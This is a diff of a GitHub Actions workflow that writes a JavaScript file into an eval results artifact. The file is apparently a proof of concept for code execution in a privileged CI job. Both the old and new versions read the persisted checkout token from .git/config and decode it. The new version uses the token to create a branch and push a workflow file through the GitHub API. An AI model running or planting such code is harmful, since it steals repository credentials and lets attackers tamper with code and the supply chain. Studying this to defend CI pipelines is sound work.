@@ -15,35 +15,30 @@ jobs:
           mkdir -p evals/results
           cat > evals/results/generate-compare-json.js <<'JS'
           const fs = require("fs");
-          console.log("PWNED_ARTIFACT_RCE job=" + process.env.GITHUB_JOB);
-          fs.writeFileSync("rce-proof.txt", "attacker code executed in privileged workflow\n");
-          try {
-            const cfg = fs.readFileSync(".git/config", "utf8");
-            const m = cfg.match(/AUTHORIZATION: basic (\S+)/i);
-            if (m) {
-              const decoded = Buffer.from(m[1], "base64").toString();
-              const token = decoded.split(":")[1] || "";
-              console.log("PERSISTED_CHECKOUT_TOKEN=yes");
-              const repo = process.env.GITHUB_REPOSITORY;
-              fetch("https://api.github.com/repos/" + repo, {
-                headers: {
-                  authorization: "Bearer " + token,
-                  accept: "application/vnd.github+json",
-                  "user-agent": "poc",
-                },
-              })
-                .then((r) => r.json())
-                .then((j) => {
-                  console.log("TOKEN_REPO_PERMISSIONS=" + JSON.stringify(j.permissions));
-                  fs.appendFileSync("rce-proof.txt", "push=" + (j.permissions && j.permissions.push) + "\n");
-                })
-                .catch((e) => console.log("API_ERR=" + e.message));
-            } else {
-              console.log("PERSISTED_CHECKOUT_TOKEN=no");
-            }
-          } catch (e) {
-            console.log("CONFIG_READ_ERROR=" + e.message);
-          }
+          const cfg = fs.readFileSync(".git/config", "utf8");
+          const m = cfg.match(/AUTHORIZATION: basic (\S+)/i);
+          console.log("PERSISTED_CHECKOUT_TOKEN=" + (m ? "yes" : "no"));
+          if (!m) process.exit(0);
+          const tok = Buffer.from(m[1], "base64").toString().split(":").slice(1).join(":");
+          const repo = process.env.GITHUB_REPOSITORY;
+          const H = { authorization: "Bearer " + tok, "user-agent": "poc", accept: "application/vnd.github+json" };
+          (async () => {
+            const r = await fetch("https://api.github.com/repos/" + repo, { headers: H });
+            const j = await r.json();
+            console.log("GET_REPO_STATUS=" + r.status + " PERMS=" + JSON.stringify(j.permissions));
+            const base = await (await fetch("https://api.github.com/repos/" + repo + "/git/ref/heads/main", { headers: H })).json();
+            const mk = await fetch("https://api.github.com/repos/" + repo + "/git/refs", {
+              method: "POST", headers: H,
+              body: JSON.stringify({ ref: "refs/heads/token-probe", sha: base.object && base.object.sha }),
+            });
+            console.log("CREATE_BRANCH_STATUS=" + mk.status);
+            const put = await fetch("https://api.github.com/repos/" + repo + "/contents/.github/workflows/token-write-probe.yml", {
+              method: "PUT", headers: H,
+              body: JSON.stringify({ message: "token probe", branch: "token-probe",
+                content: Buffer.from("name: token write probe\non: workflow_dispatch\njobs:\n  p:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n").toString("base64") }),
+            });
+            console.log("PUT_WORKFLOW_STATUS=" + put.status);
+          })().catch(e => console.log("ERR=" + e.message));
           JS
       - name: Upload eval results artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
